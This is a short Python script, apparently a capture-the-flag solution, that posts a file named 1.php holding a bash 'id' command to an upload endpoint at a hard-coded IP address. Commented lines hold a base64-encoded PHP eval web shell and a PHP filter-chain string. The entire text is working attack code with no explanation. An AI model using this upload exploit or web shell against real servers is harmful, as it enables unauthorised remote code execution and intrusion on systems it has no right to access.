# a="phpfilterconvertbase64decoderesource"
# b="phpechoredispassisrootexit"
# c="PD9waHAgZXZhbCgkX1BPU1RbMV0pOw=="
# print(len(a))
# print(len(b))
# print(len(c))
# print(ord("z"))
import requests

name = "1.php"
url = "http://106.75.252.38:10001/d0or.php"
file = {
    'file': (name,"""#!/bin/bash
id
    """)
}
a = requests.post(url,files=file)
print(a.text)